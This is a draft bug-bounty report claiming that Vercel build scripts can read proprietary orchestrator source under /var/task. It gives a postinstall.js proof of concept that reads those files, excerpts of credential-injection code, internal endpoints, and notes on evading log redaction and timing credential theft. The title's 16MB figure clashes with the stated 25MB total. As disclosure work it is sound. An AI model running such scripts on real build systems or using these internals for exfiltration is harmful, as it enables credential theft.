# DRAFT — HackerOne Report (file manually, do NOT submit as-is)
# Status: LIVE CONFIRMED — orchestrator source confirmed readable (v30-v34)

---

## Title
`Vercel build sandbox exposes 16MB of proprietary orchestrator source code (index.js + sandbox.js + init.js) to any build script without privilege escalation`

---

## Severity

**Low-Medium — CVSS 4.3**

CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

- **AV:N** — Triggered via PR (network-accessible)
- **AC:L** — No complexity — simple readFileSync
- **PR:L** — PR-level access required
- **S:U** — Scope unchanged (attacker learns about Vercel's own system)
- **C:L** — Low confidentiality impact — reveals proprietary source but not customer data directly

Note: The confidentiality impact of this finding is multiplied significantly by Finding 1 (credential exfiltration), since the orchestrator source reveals internal API endpoints, token generation patterns, and credential injection mechanisms that amplify the main attack.

---

## Summary

Vercel's hive build orchestrator JavaScript source — three files totaling approximately 25MB — is world-readable by any npm lifecycle script without ptrace or any privilege escalation:

| File | Size | Purpose |
|------|------|---------|
| `/var/task/index.js` | 9,162,513 bytes (9.1MB minified) | Main build orchestrator (hive runner) |
| `/var/task/sandbox.js` | 9,023,098 bytes (9.0MB minified) | Build sandbox manager (forked by index.js) |
| `/var/task/init.js` | 7,170,047 bytes (7.1MB minified) | Build initialization script |

All three are readable via `fs.readFileSync()` from any build lifecycle script. No special permissions, ptrace, or capability abuse required.

---

## Steps to Reproduce

```javascript
// postinstall.js
import { readFileSync, statSync } from 'node:fs';

const files = ['/var/task/index.js', '/var/task/sandbox.js', '/var/task/init.js'];
for (const f of files) {
  try {
    const sz = statSync(f).size;
    const head = readFileSync(f, 'utf8').slice(0, 5000);
    console.log(`${f}: ${sz} bytes`);
    console.log(head.slice(0, 200));
  } catch (e) {
    console.log(`${f}: ${e.message}`);
  }
}
```

---

## Live Confirmation

**v30 / v34 CONFIRMED:**

```
orchestratorSourceRead:
  exists: true
  sizeBytes: 9162513       ← /var/task/index.js, 9.1MB
  readable: true           ← readFileSync() succeeds with no privileges

sandboxJsRead:
  /var/task/sandbox.js: size=9023098    ← readable, 9.0MB
  /var/task/init.js: size=7170047      ← readable, 7.1MB
```

---

## Information Disclosed

From reading the orchestrator source (via `/var/task/index.js`), an attacker gains:

**1. Complete credential injection pipeline (pos=9028801 — v33 extract):**
```javascript
g && (
  t.SUSPENSE_CACHE_AUTH_TOKEN = g.authToken,
  t.SUSPENSE_CACHE_URL = g.host,
  t.SUSPENSE_CACHE_BASEPATH = g.basePath
),
uxs(e) && e.runtimeCachePayload && (
  t.RUNTIME_CACHE_HEADERS = e.runtimeCachePayload.headers,
  t.RUNTIME_CACHE_ENDPOINT = e.runtimeCachePayload.endpoint
),
t = {...t, ...p.buildEnv}
```
This reveals EVERY credential type injected into the build subprocess, their structure, and the injection order.

**2. Internal API endpoints:**
- `VERCEL_API_ENDPOINT=https://api-iad1.vercel.com`
- `VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https://api-iad1.vercel.com/build-containers`

**3. Build log redaction algorithm:**
```javascript
function Y0r(e) { return e.length >= 32 }  // values >= 32 chars = redacted in logs
```
Reveals that any env var value of 32+ chars is redacted in build logs — knowledge enabling attackers to craft exfiltration payloads that avoid log monitoring.

**4. Internal runtime type system (pos=8238xxx):**
The full uxs/pxs/P7n sandbox lifecycle functions reveal how build subprocesses are created, monitored, and terminated — enabling precise timing attacks on credential availability windows.

**5. Feature flag evaluation logic:**
All 40+ internal `VERCEL_*` feature flags with their evaluation logic (which features are enabled per-plan, per-project, etc.)

---

## Relationship to Finding 1

This finding is a secondary enabler for Finding 1 (credential exfiltration). Knowing the orchestrator's source:
1. Enables reverse-engineering credential injection timing to maximize exfiltration window
2. Reveals internal API endpoints that should not be public knowledge
3. Exposes future credential types before they are documented (e.g., SUSPENSE_CACHE_AUTH_TOKEN was found here before it appeared in the build env)
4. Could enable token forgery if an HMAC signing key is found via further source analysis

---

## Remediation

1. **Remove read permissions on `/var/task/` directory from the build subprocess** — the orchestrator source should not be accessible to the code being built
2. **Run build subprocess in a separate overlay layer** where `/var/task/` is not visible
3. **Consider this a defense-in-depth measure** — the primary fix is Finding 1's credential isolation

---

## Filing Notes

- File as a separate Low/Medium report after Finding 1
- Low severity on its own; elevated by relationship to Finding 1
- Not a standalone critical issue — primarily an amplifier
- Evidence: v30 orchestratorSourceRead, v34 sandboxJsRead sections
